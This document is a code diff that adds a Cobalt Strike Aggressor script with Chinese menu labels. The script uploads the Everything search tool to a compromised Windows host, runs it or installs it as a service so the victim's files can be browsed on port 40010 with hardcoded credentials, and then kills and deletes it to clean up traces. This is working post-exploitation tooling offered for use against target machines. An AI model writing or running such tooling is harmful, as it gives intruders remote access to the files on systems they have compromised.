@@ -1,0 +1,47 @@
+#远程屏幕
+
+
+   menu "远程目录映射" {
+    item "上传 远程目录映射工具" {
+      blog($1, "\c9=========== 上传 远程目录映射工具 ==========");
+      $bid = $1;
+      $dialog = dialog("上传远程目录映射工具", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &Everything);
+      dialog_description($dialog, "访问目标机器web=》40010端口 user:susu passwd:susu");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub Everything {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/directory/Everything.exe"));
+      bupload($bid, script_resource("/scripts/directory/Everything.ini"));
+      }
+    item "运行 远程目录映射工具"{
+      blog($1, "\c9=========== 运行 远程目录映射工具 ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------使用方法---------------------------------------", "");
+      btask($bid, "
+      有管理权限执行：Everything.exe -install-client-service  
+      无权限执行：Everything.exe
+      现在你可以访问 目标ip:40010 端口 账户：susu  密码：susu", " 查看使用手册  中文 请使用GBK编码");
+
+      $dialog = dialog("运行fscan",%(exec => "Everything.exe", bid => $bid),&Everything_run);
+      dialog_description($dialog, "有管理权限：Everything.exe -install-client-service  无权限：Everything.exe
+      ");
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub Everything_run{
+      $exec = $3['exec'];
+      brun($bid, "$exec");
+    }
+    item "删除 远程目录映射工具"{
+      blog($1, "\c9=========== 删除 远程目录映射工具 ==========");
+      $bid = $1['@'];
+      bshell($bid, "taskkill -f /im Everything.exe & del /f /s /q Everything.exe");
+    }
+    }
+
+
+
